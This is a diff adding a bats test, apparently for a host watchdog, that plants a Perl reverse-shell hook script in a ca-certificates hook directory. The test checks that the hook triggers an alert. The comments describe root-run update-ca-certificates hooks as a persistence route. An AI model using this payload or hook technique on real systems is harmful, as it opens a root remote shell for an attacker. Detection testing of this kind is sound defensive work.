@@ -289,3 +289,19 @@ EOF
     run_wd
     cap | grep -qE '"severity":"(alert|warn)"'
 }
+
+@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on ca-certificates hook surface)" {
+    # Sister to nc / python -c / curl|bash / dev-tcp ca-certificates
+    # rev-shell variants already locked. Perl is on every Debian/
+    # Ubuntu host as dpkg/locale dependency; 'use Socket' produces
+    # a one-liner connect-back PTY just as cleanly as Python. Locks
+    # the perl axis on the T1546 ca-certificates update-trigger
+    # root-exec persistence surface — update-ca-certificates runs
+    # hook scripts AS ROOT on every CA store rebuild.
+    seed_benign
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '#!/bin/sh\nperl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${HOOKD}/jks-keystore"
+    run_wd
+    cap | grep -qE '"severity":"(alert|warn)"'
+}
